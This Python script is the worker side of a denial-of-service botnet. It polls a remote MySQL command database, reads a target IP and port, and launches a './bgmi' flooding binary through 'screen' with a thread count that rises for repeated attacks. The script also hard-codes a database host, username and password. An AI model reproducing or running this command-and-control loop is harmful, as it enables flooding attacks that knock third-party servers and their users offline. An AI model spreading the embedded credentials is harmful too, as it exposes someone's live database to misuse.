import mysql.connector
import subprocess
import os
import time
from datetime import datetime
import requests
import pytz

#Maximum Connection Issue Fixed, Auto ConCurrent Swift Feature Added!

# Server 3 #

# Establishing the connection
conn = mysql.connector.connect(
    host="srv984.hstgr.io",
    user="u603194748_TestDDoS333",
    password="T8mdb6?h*8>",
    database="u603194748_TestDDoS333"
)

# Creating a cursor object using the cursor() method
insertrec = conn.cursor()
# Creating a cursor object using the cursor() method
cursor = conn.cursor()

isMaximumAttack = "0"
LastAttack = 123456

while True == True:

    # Query to retrieve data from a specific field for three rows
    query = "SELECT Status FROM Data3"

    try:
        # Executing the SQL command
        insertrec.execute(query)
        row = insertrec.fetchone()
        result1 = row[0]
        print("Online & Fine!")

    except mysql.connector.Error as e:
        print(f"Error: {e}")

    if (result1 != "1"):
        
        seconds345 = time.time()
        intSeconds345 = int(seconds345)

        if (LastAttack + 300 < intSeconds345):
            isMaximumAttack = "0"
        if (isMaximumAttack == "1"):
            # Update query for three rows
            update_query = """
            UPDATE Data3
            SET Status = %s, Ip = %s
            WHERE id = %s
            """

            # Data3 for updating rows
            data = [
                (intSeconds345, "1", "1")
            ]
        else:
            # Update query for three rows
            update_query = """
            UPDATE Data3
            SET Status = %s, Ip = %s
            WHERE id = %s
            """

            # Data3 for updating rows
            data = [
                (intSeconds345, "0", "1")
            ]

        try:
            # Executing the SQL command to update rows
            cursor.executemany(update_query, data)

            # Commit your changes in the database
            conn.commit()
            #print("Status Set To Default")

        except mysql.connector.Error as e:
            # Rolling back in case of an error
            print(f"Error: {e}")
            conn.rollback()

    if (result1 == "1"):

        ########################################################
        # Establishing the connection
        conn = mysql.connector.connect(
            host="srv984.hstgr.io",
            user="u603194748_TestDDoS333",
            password="T8mdb6?h*8>",
            database="u603194748_TestDDoS333"
        )

        # Creating a cursor object using the cursor() method
        insertrec = conn.cursor()
        # Creating a cursor object using the cursor() method
        cursor = conn.cursor()
        ##########################################################

        
        # Getting Ip Here
        query = "SELECT Ip FROM Data3"

        try:
            # Executing the SQL command
            insertrec.execute(query)
            row = insertrec.fetchone()
            result2 = row[0]
            #print("Attacker Ip:", result2)

        except mysql.connector.Error as e:
            print(f"Error: {e}")

        # Getting Port Here
        query = "SELECT Port FROM Data3"

        try:
            # Executing the SQL command
            insertrec.execute(query)
            row = insertrec.fetchone()
            result3 = row[0]
            print("Attack ID:- " + result3 + " || Time:- " + str(datetime.now()))

        except mysql.connector.Error as e:
            print(f"Error: {e}")

        seconds22 = time.time()
        intSeconds22 = int(seconds22)

        if (LastAttack + 300 < intSeconds22):
            ThreadsCanBe = 25
            isMaximumAttack = "0"
        else:
            ThreadsCanBe = 200
            isMaximumAttack = "1"

        LastAttack = intSeconds22

        CMD = f"screen -dm ./bgmi {result2} {result3} 180 {ThreadsCanBe}"
        #print(CMD)
        os.system(CMD)

        # Run This When Main Terminal Command Executed Successfully

        # Update query for three rows
        update_query = """
        UPDATE Data3
        SET Status = %s, Ip = %s, Port = %s
        WHERE id = %s
        """

        seconds = time.time()
        intSeconds = int(seconds)


        # Data3 for updating rows
        data = [
            (intSeconds, "IpHere", "PortHere", "1")
        ]

        try:
            # Executing the SQL command to update rows
            cursor.executemany(update_query, data)

            # Commit your changes in the database
            conn.commit()
            #print("Status Set To Default")

        except mysql.connector.Error as e:
            # Rolling back in case of an error
            print(f"Error: {e}")
            conn.rollback()

    utc_now = datetime.utcnow()
    # Get the Indian time zone
    india_timezone = pytz.timezone('Asia/Kolkata')
    # Convert UTC time to Indian time
    CurrentIndiaTimeBro = utc_now.astimezone(india_timezone)
    hour = CurrentIndiaTimeBro.hour

    if (hour > 0 and hour < 7):
        break    
